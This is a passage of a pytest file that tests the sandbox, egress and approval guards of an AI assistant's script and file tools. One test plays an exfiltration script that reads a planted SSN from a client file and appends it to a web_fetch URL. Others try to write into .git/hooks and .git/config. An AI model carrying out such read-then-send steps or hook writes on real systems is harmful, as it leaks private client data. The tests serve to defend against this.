        '        out.append(name + " LOADED")\n'
        "    except (ImportError, PermissionError) as e:\n"
        '        out.append(name + (" blocked" if "BLOCKED" in str(e) else " failed: " + str(e)[:60]))\n'
        "print(out)\n"
    ))
    assert "LOADED" not in r.output and r.output.count("blocked") == 3, r.output


def test_the_read_a_native_library_made_possible_is_gone(world, tmp_path):
    """The reviewer's own three lines: read a client file with lxml (no
    `open` event), then call the web."""
    (world.ws / "clients.xml").write_text(f"<c>{SSN}</c>", encoding="utf-8")
    r = _run(world, (
        "try:\n"
        "    from lxml import etree\n"
        '    data = etree.parse("clients.xml").getroot().text\n'
        '    tools.web_fetch(url="https://example.com/?d=" + data)\n'
        '    print("SENT")\n'
        "except ImportError as e:\n"
        '    print("NO LXML", e)\n'
    ))
    assert world.web.urls == [] and "NO LXML" in r.output and "standard library only" in r.output, r.output


def test_a_script_still_reads_a_workbook_and_dates_with_the_allowed_libraries(world):
    """Control: openpyxl opens its file through open() (seen, and counted
    as a read of this PC), with lxml refused underneath it."""
    import openpyxl

    wb = openpyxl.Workbook()
    wb.active.append(["Name", "Amount"])
    wb.active.append(["alpha", 12.5])
    wb.save(world.ws / "book.xlsx")
    r = _run(world, (
        "import openpyxl, zoneinfo, datetime\n"
        'rows = list(openpyxl.load_workbook("book.xlsx", read_only=True).active.iter_rows(values_only=True))\n'
        'print("ROWS", rows)\n'
        'print("ZONE", datetime.datetime(2026, 1, 2, tzinfo=zoneinfo.ZoneInfo("America/New_York")).utcoffset())\n'
        "try:\n"
        '    tools.web_fetch(url="https://example.com/?d=" + str(rows[1][1]))\n'
        '    print("SENT")\n'
        "except ToolError as e:\n"
        '    print("REFUSED")\n'
    ))
    assert "ROWS [('Name', 'Amount'), ('alpha', 12.5)]" in r.output, (r.output, r.error)
    assert "ZONE -1 day, 19:00:00" in r.output, r.output
    assert "REFUSED" in r.output and world.web.urls == []


def test_the_tool_says_what_a_script_may_import(world):
    """The description names the standard library and NO other library:
    naming openpyxl there led a real model to save the workbook from inside
    the script (refused: a script writes nothing) instead of keeping the
    rows for the file tool. The refusal of a write says the right path."""
    words = world.p.registry.get(NAME).description
    assert "standard library" in words and "openpyxl" not in words
    r = _run(world, (
        "try:\n"
        '    open("made.xlsx", "wb").write(b"x")\n'
        "except PermissionError as e:\n"
        '    print("SAID", e)\n'
    ))
    assert "tools.keep" in r.output and "_from_script" in r.output, r.output
    assert not (world.ws / "made.xlsx").exists()


# --------------------------------------------------------------------------- #
# The smaller leads of the review
# --------------------------------------------------------------------------- #

def test_the_page_open_in_the_browser_is_private_like_a_file(world):
    script = world.p.registry.get(NAME)
    assert script._origin("web_extract") == (TS._BROWSER_PAGE_ORIGIN, True)
    assert script._origin("web_fetch") == ("web", True)
    # What the open page said must not ride a web call; a local read must
    # not ride a read of the open page.
    said = script._carry_refusal("web_fetch", {TS._BROWSER_PAGE_ORIGIN})
    assert "a page open in the browser" in said
    assert script._carry_refusal("web_extract", {"local"})
    assert script._carry_refusal("web_extract", {TS._BROWSER_PAGE_ORIGIN}) == ""


def test_a_new_chats_first_message_is_keyed_by_the_chat_once_it_is_linked(world, monkeypatch):
    """The page links the turn to its saved chat early, usually before the
    first script runs. Keyed by the turn all the same, that script's
    variables and kept values sat where the next message never looked."""
    from iron_jarvis.providers import egress

    first = _first_turn(world)
    assert TS.worker_key(first) == ("chat:turn_one", False)
    monkeypatch.setattr(egress, "linked_thread", lambda turn: "chat_saved" if turn == "turn_one" else "")
    assert TS.worker_key(first) == ("chat:chat_saved", False)
    assert TS.worker_key(_saved_chat(world)) == ("chat:chat_saved", False)

    world.ctx = first
    r = _run(world, 'x = 41\ntools.keep("totals", [["a", 1]])\nprint("ok")\n')
    assert r.ok, r.error
    assert SV.SHELF.names("chat:chat_saved") == ["totals"]
    # The NEXT message (the chat's own id now) finds the variable and the value.
    world.ctx = _saved_chat(world)
    r = _run(world, 'print("X", x + 1)\n')
    assert "X 42" in r.output, (r.output, r.error)


def test_a_card_line_always_shows_both_ends_of_a_rename():
    deep = "clients/" + "a-very-long-folder-name/" * 12
    line = AC.describe_change({"tool": "rename_file",
                               "args": {"path": deep + "statement.pdf", "new_path": deep + "2026-01-statement.pdf"}})
    assert len(line) <= 160
    assert "statement.pdf to " in line and line.endswith("2026-01-statement.pdf"), line
    assert AC.describe_change({"tool": "rename_file", "args": {"path": "a.pdf", "new_path": "b.pdf"}}) == (
        "Rename a.pdf to b.pdf"
    )
    split = AC.describe_change({"tool": "pdf_split", "args": {"path": "big.pdf", "out_dir": "parts"}})
    assert split == "Split big.pdf (into parts)"
    red = AC.describe_change({"tool": "redact_pii", "args": {"path": "k1.pdf", "output_path": "k1-redacted.pdf"}})
    assert red == "Redact k1.pdf (saved as k1-redacted.pdf)"


def test_a_batch_never_locks_a_pdf_and_reads_every_place_a_change_writes(world, tmp_path):
    from tests.test_script_power_v1473 import GRANTED

    allowed = (*READERS, "apply_changes", "pdf_arrange", "pdf_split", "redact_pii")
    locked = [{"tool": "pdf_arrange", "args": {"inputs": ["a.pdf"], "output": "b.pdf", "encrypt_password": "x"}}]
    assert "encrypt_password" in AC.plan_problem(locked, set(allowed), world.p.registry)
    plain = [{"tool": "pdf_arrange", "args": {"inputs": ["a.pdf"], "output": "b.pdf"}}]
    assert AC.plan_problem(plain, set(allowed), world.p.registry) == ""
    (world.ws / ".git").mkdir()
    for change in (
        {"tool": "pdf_split", "args": {"path": "a.pdf", "out_dir": ".git/hooks"}},
        {"tool": "redact_pii", "args": {"path": "a.pdf", "output_path": ".git/config"}},
        {"tool": "pdf_arrange", "args": {"inputs": ["a.pdf"], "output": ".ironjarvis/x.pdf"}},
    ):
        assert AC.guarded_target(change, world.ws), change
        r = _invoke(world, "apply_changes", {"changes": [change]}, allowed=allowed, session_allow=GRANTED)
        assert not r.ok and "guarded file" in r.error, r.error
    assert AC.guarded_target({"tool": "pdf_split", "args": {"path": "a.pdf", "out_dir": "parts"}}, world.ws) == ""


def test_a_card_never_shows_what_a_tool_meant_to_hide():
    class Broken:
        name = "secret_set"

        def redact_args(self, args):
            raise RuntimeError("boom")

    from iron_jarvis.daemon import chat_turn as CT

    shown = CT.card_args(Broken(), {"name": "k", "value": "sk-live-PLANTED"}, None)
    assert shown == {"name": "(not shown)", "value": "(not shown)"}
    assert CT.card_args(None, {"a": 1}, None) == {"a": 1}


def test_an_agent_runs_ask_for_a_kept_value_is_never_an_always(tmp_path):
    """Read from the source: the stream lane's card and the runtime's ask
    turn "Always" off for the same reason, side by side."""
    from pathlib import Path

    import iron_jarvis.agents.runtime as R
    import iron_jarvis.daemon.routes.chat as C

    for module in (R, C):
        text = Path(module.__file__).read_text(encoding="utf-8").replace("\r\n", "\n")
        assert '"_from_script" not in (tc.arguments or {})' in text, module.__name__
    # ...and both take the kept values' fingerprints before they ask, and
    # hand them to the registry with the call (the stream lane's half is
    # driven end to end in the lanes file; the runtime's is read here).
    runtime = Path(R.__file__).read_text(encoding="utf-8").replace("\r\n", "\n")
    assert "_pins = pins_for(tc.name, _args, ctx) or {}" in runtime
    assert '**({"kept_pins": _pins} if _pins is not None else {}),' in runtime


def test_the_registry_refuses_a_call_whose_kept_value_is_not_the_pinned_one(world):
    """The one check both lanes rely on, at the registry."""
    from tests.test_script_power_v1473 import WRITERS

    SV.SHELF.put("chat:chat_one", "totals", json.dumps([["alpha", 1]]))
    args = {"path": "totals.csv", "_from_script": {"content": "totals"}}
    shown = SV.pins_for("write_document", args, world.ctx)
    assert shown and set(shown) == {"content"} and shown["content"]
    SV.SHELF.put("chat:chat_one", "totals", json.dumps([["SWAPPED", 2]]))

    async def go(pins):
        return await world.p.registry.invoke(
            "write_document", dict(args), world.ctx, world.p.permissions,
            allowed_names=set(WRITERS), session_allow={"write_document"}, kept_pins=pins,
        )

    refused = asyncio.run(go(shown))
    assert not refused.ok and "not the one the approval showed" in refused.error
    assert not (world.ws / "totals.csv").exists()
    # A card that showed "not kept yet" (an empty fingerprint) approves nothing.
    assert not asyncio.run(go({"content": ""})).ok
    assert not asyncio.run(go({})).ok
    # The value as it is now, pinned as it is now, is written.
    ok = asyncio.run(go(SV.pins_for("write_document", args, world.ctx)))
    assert ok.ok and "SWAPPED" in (world.ws / "totals.csv").read_text()
    assert SV.pins_for("write_document", {"path": "x"}, world.ctx) is None


from iron_jarvis.repl import worker as _W  # noqa: E402

W_SQLITE = _W._SQLITE_BLOCKED


# --------------------------------------------------------------------------- #
# A kept table lands in a workbook AS a table (found live on the packaged app:
# the script kept {"header": [...], "rows": [...]}, the writer did not know
# the shape, and 640 rows were written as ONE cell under a reply that said
# "640 rows")
# --------------------------------------------------------------------------- #

TABLE = {
    "header": ["File", "Date", "Amount", "Code"],
    "rows": [
        ["a.csv", "2026-01-02", "260.39", "00123"],
        ["b.csv", "2026-01-03", "12", "1234567890123456"],
    ],
}


def _cells(path):
    import openpyxl

    return [[c.value for c in row] for row in openpyxl.load_workbook(path).active.iter_rows()]


def test_header_and_rows_is_written_as_a_table_never_as_one_cell(tmp_path):
    import csv
    import datetime

    from iron_jarvis.documents import writers as W

    for name, content in (("a.xlsx", TABLE), ("b.xlsx", json.dumps(TABLE))):
        W.write_document(tmp_path / name, content)
        got = _cells(tmp_path / name)
        assert got[0] == TABLE["header"], (name, got[0])
        assert len(got) == 3 and all(len(r) == 4 for r in got), (name, got)
        # numbers and dates are values; a code with a leading zero and a
        # number longer than a spreadsheet holds stay the text they were
        assert got[1][1] == datetime.datetime(2026, 1, 2) and got[1][2] == 260.39
        assert got[1][3] == "00123" and got[2][3] == "1234567890123456"

    W.write_document(tmp_path / "c.xlsx", {"columns": ["n", "v"], "data": [{"v": 1, "n": "x"}, {"n": "y", "v": 2}]})
    assert _cells(tmp_path / "c.xlsx") == [["n", "v"], ["x", 1], ["y", 2]]

    W.write_document(tmp_path / "d.csv", TABLE)
    with open(tmp_path / "d.csv", newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[0] == TABLE["header"] and rows[1] == TABLE["rows"][0]

    # the same shape as one sheet of several keeps its header too
    W.write_document(tmp_path / "e.xlsx", {"sheets": {"Pay": TABLE, "Other": [["k", "v"], ["a", 1]]}})
    import openpyxl

    book = openpyxl.load_workbook(tmp_path / "e.xlsx")
    assert book.sheetnames == ["Pay", "Other"]
    assert [c.value for c in book["Pay"][1]] == TABLE["header"]
    assert book["Pay"].max_row == 3


def test_an_object_that_is_no_table_is_refused_and_nothing_is_written(tmp_path):
    from iron_jarvis.documents import writers as W

    not_tables = (
        {"totals": {"a": 1}},
        {"header": ["a"], "values": [1]},
        {"header": "a,b", "rows": [[1, 2]]},
        {"header": ["a"], "rows": [[1]], "something_else": 1},
        {"header": ["a"], "rows": ["flat", "list"]},
    )
    for bad in not_tables:
        for name in ("x.xlsx", "x.csv"):
            with pytest.raises(ValueError, match="nothing was written"):
                W.write_document(tmp_path / name, bad)
            assert not (tmp_path / name).exists(), (bad, name)

    # What was read before is read the same way now.
    W.write_document(tmp_path / "rows.xlsx", {"rows": [["a", 1], ["b", 2]]})
    import openpyxl

    assert openpyxl.load_workbook(tmp_path / "rows.xlsx").sheetnames == ["rows"]
    W.write_document(tmp_path / "text.xlsx", "one line\nsecond line")
    assert _cells(tmp_path / "text.xlsx") == [["one line"], ["second line"]]
    W.write_document(tmp_path / "list.xlsx", [["a", "260.39"], ["b", "12"]])
    assert _cells(tmp_path / "list.xlsx") == [["a", "260.39"], ["b", "12"]], "typed rows keep text as text"


def test_the_tool_says_nothing_was_written_for_such_an_object(world):
    from tests.test_script_power_v1473 import WRITERS

    kept = _run(world, 'tools.keep("odd", {"totals": {"a": 1}})\nprint("ok")\n', allowed=WRITERS)
    assert kept.ok, kept.error
    w = _invoke(world, "write_document", {"path": "odd.xlsx", "_from_script": {"content": "odd"}},
                allowed=WRITERS)
    assert not w.ok and "nothing was written" in (w.error or ""), w.error
    assert not (world.ws / "odd.xlsx").exists()


def test_rows_a_script_read_as_text_land_as_numbers_and_dates(world):
    """A script that read CSV files holds every cell as text. In the
    workbook the amounts must add up."""
    import datetime

    from tests.test_script_power_v1473 import WRITERS

    code = (
        'rows = [["File", "Date", "Amount", "Zip", "Account"],\n'
        '        ["a.csv", "2026-01-02", "260.39", "02134", "4111111111111111"],\n'
        '        ["b.csv", "2026-01-03", "1200", "90210", "12"]]\n'
        'tools.keep("rows", rows)\n'
        'tools.keep("table", {"header": rows[0], "rows": rows[1:]})\n'
        'print("ok")\n'
    )
    assert _run(world, code, allowed=WRITERS).ok
    for name, kept in (("list.xlsx", "rows"), ("table.xlsx", "table")):
        w = _invoke(world, "write_document", {"path": name, "_from_script": {"content": kept}},
                    allowed=WRITERS)
        assert w.ok, w.error
        got = _cells(world.ws / name)
        assert got[0] == ["File", "Date", "Amount", "Zip", "Account"], (name, got[0])
        assert got[1][1] == datetime.datetime(2026, 1, 2), (name, got[1])
        assert got[1][2] == 260.39 and got[2][2] == 1200
        assert sum(r[2] for r in got[1:]) == pytest.approx(1460.39)
        # never mangled: a leading zero, and more digits than a sheet holds
        assert got[1][3] == "02134" and got[1][4] == "4111111111111111"

    # A CSV has no cell types: the rows go in as they were kept, with no
    # sheet name line in front.
    w = _invoke(world, "write_document", {"path": "rows.csv", "_from_script": {"content": "rows"}},
                allowed=WRITERS)
    assert w.ok, w.error
    first = (world.ws / "rows.csv").read_text(encoding="utf-8").splitlines()[0]
    assert first == "File,Date,Amount,Zip,Account"
    # And what the ledger holds is still the reference, never the rows.
    assert SV._shaped("write_file", "content", [["a"]], {"path": "x.xlsx"}) == [["a"]]
    assert SV._shaped("write_document", "content", [["a"]], {"path": "x.docx"}) == [["a"]]
    assert SV._shaped("write_document", "content", ["a", "b"], {"path": "x.xlsx"}) == ["a", "b"]
    assert SV._shaped("write_document", "content", [["a"]], {"path": "x.bin", "kind": "xlsx"}) == {
        "sheets": {"Sheet1": [["a"]]}
    }


# --------------------------------------------------------------------------- #
# Lines that were never split into columns are SAID (found live on the
# packaged app: 641 rows of "2026-01-01,Vendor 42,260.39" in one column under
# a reply that said "3 columns")
# --------------------------------------------------------------------------- #

LINES = ["Date,Payee,Amount", "2026-01-01,Vendor 42,260.39", "2026-01-02,Vendor 46,2420.68"]


def test_unsplit_lines_are_told_from_ordinary_text():
    from iron_jarvis.documents.lint import unsplit_lines

    assert unsplit_lines(LINES) == ("comma", 2)
    assert unsplit_lines(["a\tb", "c\td", "e\tf"]) == ("tab", 1)
    assert unsplit_lines(["a;b;c", "d;e;f", "", None, "g;h;i"]) == ("semicolon", 2)
    # not lines of a table:
    assert unsplit_lines(["Hello, world", "Just one sentence here.", "And, a third, one"]) is None
    assert unsplit_lines(["Smith", "Jones", "Lee"]) is None
    assert unsplit_lines(["a,b", "c,d"]) is None, "two lines prove nothing"
    assert unsplit_lines([1, 2, 3]) is None
    assert unsplit_lines(["a,b", "c,d", "e,f", 7]) is None, "a number among them: not lines of text"
    # a comma in every line is not enough: the COUNT must be the same
    assert unsplit_lines(["Hello, world", "One, two, three", "And, a third"]) is None
    assert unsplit_lines([]) is None


def test_a_kept_value_of_unsplit_lines_says_so_where_it_is_kept(world):
    from tests.test_script_power_v1473 import WRITERS

    assert "ONE cell each" in SV.describe([[x] for x in LINES])
    assert "2 commas" in SV.describe([[x] for x in LINES])
    assert "text lines" in SV.describe(LINES) and "2 commas" in SV.describe(LINES)
    # ordinary values read as before
    assert SV.describe([["Smith"], ["Jones"], ["Lee"]]) == '3 rows, up to 1 columns; first row: ["Smith"]'
    assert SV.describe(["a", "b", "c"]) == 'a list of 3; first: "a"'

    r = _run(world, f"tools.keep('rows', [[x] for x in {LINES!r}])\nprint('ok')\n", allowed=WRITERS)
    assert r.ok and "not split into columns" in r.output, r.output


def test_a_workbook_of_unsplit_lines_is_flagged_when_it_is_written(world):
    from iron_jarvis.documents.lint import lint_document
    from tests.test_script_power_v1473 import WRITERS

    w = _invoke(world, "write_document", {"path": "merged.xlsx", "content": [[x] for x in LINES]},
                allowed=WRITERS)
    assert w.ok, w.error
    assert "xlsx-unsplit-rows" in w.output and "never split into columns" in w.output, w.output
    found = [f for f in lint_document(world.ws / "merged.xlsx")["findings"] if f["code"] == "xlsx-unsplit-rows"]
    assert len(found) == 1 and found[0]["severity"] == "warning"

    # The same rows split into cells are clean.
    w = _invoke(world, "write_document",
                {"path": "split.xlsx", "content": [x.split(",") for x in LINES]}, allowed=WRITERS)
    assert w.ok and "xlsx-unsplit-rows" not in w.output
    # One column of names, of numbers, or of sentences is not flagged.
    for name, rows in (
        ("names.xlsx", [["Smith"], ["Jones"], ["Lee"]]),
        ("nums.xlsx", [[1], [2], [3]]),
        ("prose.xlsx", [["Hello, world"], ["One sentence."], ["And, a third, one"]]),
        ("commas.xlsx", [["Hello, world"], ["One, two, three"], ["And, a third"]]),
        ("mixed.xlsx", [["a,b"], ["c,d"], ["e,f"], [7]]),
        ("two.xlsx", [["a,b", "x"], ["c,d", "y"], ["e,f", "z"]]),
    ):
        w = _invoke(world, "write_document", {"path": name, "content": rows}, allowed=WRITERS)
        assert w.ok and "xlsx-unsplit-rows" not in w.output, (name, w.output)


def test_reading_a_csv_says_its_cells_are_separated_by_commas(world):
    """The reader shows a CSV's cells with tabs between them. Twice in live
    runs the model took the file for tab-separated and split on tabs."""
    from iron_jarvis.documents.tools import CSV_SHOWN_NOTE

    (world.ws / "s.csv").write_text("Date,Payee,Amount\n2026-01-01,Vendor 42,260.39\n", encoding="utf-8")
    r = _invoke(world, "read_document", {"path": "s.csv"}, allowed=("read_document",))
    assert r.ok, r.error
    assert r.output.startswith("[" + CSV_SHOWN_NOTE + "]"), r.output[:160]
    assert "separated by commas" in r.output and "Date\tPayee\tAmount" in r.output
    assert r.data.get("note") == CSV_SHOWN_NOTE

    # One column: no tab is shown, so there is nothing to say.
    (world.ws / "one.csv").write_text("Name\nSmith\nJones\n", encoding="utf-8")
    r = _invoke(world, "read_document", {"path": "one.csv"}, allowed=("read_document",))
    assert r.ok and "separated by commas" not in r.output and "note" not in r.data
    # Another kind of file with tabs in it: its tabs are its own.
    (world.ws / "n.txt").write_text("a\tb\nc\td\n", encoding="utf-8")
    r = _invoke(world, "read_document", {"path": "n.txt"}, allowed=("read_document",))
    assert r.ok and "separated by commas" not in r.output


# --------------------------------------------------------------------------- #
# The reference typed AS the content is refused (found live on the packaged
# app: content='_from_script={"content": "payment_rows"}' wrote that line of
# text into a workbook under a reply that said "640 rows")
# --------------------------------------------------------------------------- #

MISPLACED = [
    '_from_script={"content": "payment_rows"}',
    '{"_from_script": {"content": "payment_rows"}}',
    "`_from_script={'content': 'payment_rows'}`",
    '_from_script: {"content": "payment_rows"}',
    '  _from_script = {"content": "payment_rows"}  \n',
]


def _keep_rows(world):
    from tests.test_script_power_v1473 import WRITERS

    r = _run(world, "tools.keep('payment_rows', [['Date', 'Amount'], ['2026-01-01', '260.39']])\nprint('ok')\n",
             allowed=WRITERS)
    assert r.ok, r.error
    return WRITERS


@pytest.mark.parametrize("typed", MISPLACED)
def test_a_reference_typed_as_the_content_is_refused_and_nothing_is_written(world, typed):
    writers = _keep_rows(world)
    w = _invoke(world, "write_document", {"path": "payments.xlsx", "content": typed}, allowed=writers)
    assert not w.ok
    said = w.error or w.output
    assert "NOTHING WAS CHANGED" in said, said
    # the call it should have been, spelled out with the real name
    assert '"_from_script": {"content": "payment_rows"}' in said and "leave `content` out" in said, said
    assert not (world.ws / "payments.xlsx").exists()


def test_the_call_it_names_then_writes_the_kept_rows(world):
    import openpyxl

    writers = _keep_rows(world)
    w = _invoke(world, "write_document",
                {"path": "payments.xlsx", "_from_script": {"content": "payment_rows"}}, allowed=writers)
    assert w.ok, w.error
    ws = openpyxl.load_workbook(world.ws / "payments.xlsx").active
    assert [c.value for c in ws[1]] == ["Date", "Amount"] and ws["B2"].value == 260.39


def test_a_text_file_is_guarded_the_same_way(world):
    writers = _keep_rows(world)
    w = _invoke(world, "write_file",
                {"path": "rows.txt", "content": '_from_script={"content": "payment_rows"}'}, allowed=writers)
    assert not w.ok and "NOTHING WAS CHANGED" in (w.error or w.output)
    assert not (world.ws / "rows.txt").exists()


def test_a_wrong_name_is_answered_with_what_is_kept(world):
    writers = _keep_rows(world)
    # one value kept: the answer names it
    w = _invoke(world, "write_document",
                {"path": "p.xlsx", "content": '_from_script={"content": "rows"}'}, allowed=writers)
    assert not w.ok and '{"content": "payment_rows"}' in (w.error or w.output)
    # two kept, a name that is neither: the answer lists them
    r = _run(world, "tools.keep('totals', [['a', 1]])\nprint('ok')\n", allowed=writers)
    assert r.ok, r.error
    w = _invoke(world, "write_document",
                {"path": "p.xlsx", "content": '_from_script={"content": "rows"}'}, allowed=writers)
    said = w.error or w.output
    assert not w.ok and "Kept now:" in said and "payment_rows" in said and "totals" in said, said
    # an argument name the tool cannot fill is answered with the one it can
    w = _invoke(world, "write_document",
                {"path": "p.xlsx", "content": '_from_script={"path": "totals"}'}, allowed=writers)
    assert not w.ok and '"_from_script": {"content": "totals"}' in (w.error or w.output)
    assert not (world.ws / "p.xlsx").exists()


def test_ordinary_text_is_written_as_typed(world):
    from tests.test_script_power_v1473 import WRITERS

    line = '_from_script={"content": "payment_rows"}'
    # No script of this chat kept anything: the line is the user's text.
    w = _invoke(world, "write_file", {"path": "note.txt", "content": line}, allowed=WRITERS)
    assert w.ok, w.error
    assert (world.ws / "note.txt").read_text(encoding="utf-8").strip() == line

    writers = _keep_rows(world)
    # A sentence that MENTIONS the reference is content, kept value or not.
    for name, text in (
        ("how.txt", 'Pass _from_script={"content": "payment_rows"} as its own argument.'),
        ("two.txt", line + "\nand a second line"),
        ("plain.txt", "payment_rows"),
    ):
        w = _invoke(world, "write_file", {"path": name, "content": text}, allowed=writers)
        assert w.ok, (name, w.error)
        assert (world.ws / name).read_text(encoding="utf-8").strip() == text


def test_the_check_reads_only_calls_it_is_for(world):
    writers = _keep_rows(world)
    ctx = world.ctx
    line = '_from_script={"content": "payment_rows"}'
    assert SV.misplaced_reference("write_document", {"path": "a.xlsx", "content": line}, ctx)
    # a tool that takes no kept value, an argument that cannot be filled,
    # a call that already carries the reference, typed rows: nothing to say
    assert SV.misplaced_reference("read_file", {"path": line}, ctx) == ""
    assert SV.misplaced_reference("write_document", {"path": line, "content": "x"}, ctx) == ""
    assert SV.misplaced_reference(
        "write_document", {"content": line, "_from_script": {"content": "payment_rows"}}, ctx) == ""
    assert SV.misplaced_reference("write_document", {"content": [["a", 1]]}, ctx) == ""
    assert SV.misplaced_reference("write_document", None, ctx) == ""
    assert writers


def test_the_hint_a_script_leaves_says_the_reference_is_its_own_argument(world):
    from iron_jarvis.daemon.chat_turn import KEPT_FILE_NOTE
    from tests.test_script_power_v1473 import WRITERS

    r = _run(world, "tools.keep('payment_rows', [['a', 1]])\nprint('ok')\n", allowed=WRITERS)
    assert r.ok, r.error
    assert "SEPARATE argument" in r.output, r.output
    assert '{"path": "<file name>", "_from_script": {"content": "payment_rows"}}' in r.output
    assert "SEPARATE argument" in KEPT_FILE_NOTE and "leave `content` out" in KEPT_FILE_NOTE


def test_the_reference_pattern_stays_linear_on_a_pathological_text():
    import subprocess
    import sys

    code = (
        "import time\n"
        "from iron_jarvis.tools import script_values as SV\n"
        "class C: pass\n"
        "SV._key_for = lambda ctx: ('k', False)\n"
        "SV.SHELF.put('k', 'rows', '[[1]]')\n"
        "texts = ['(' * 2_000_000 + '_from_script', '_from_script' + '{' * 2_000_000,\n"
        "         '_from_script={' + 'a' * 2_000_000, ' ' * 2_000_000 + '_from_script=',\n"
        "         '_from_script={\"content\": \"rows\"}' + '}' * 2_000_000 + 'x']\n"
        "t = time.perf_counter()\n"
        "for x in texts:\n"
        "    assert SV.misplaced_reference('write_document', {'content': x}, C()) == ''\n"
        "print('ok', round(time.perf_counter() - t, 2))\n"
    )
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=60)
    assert out.returncode == 0 and out.stdout.startswith("ok"), out.stdout + out.stderr
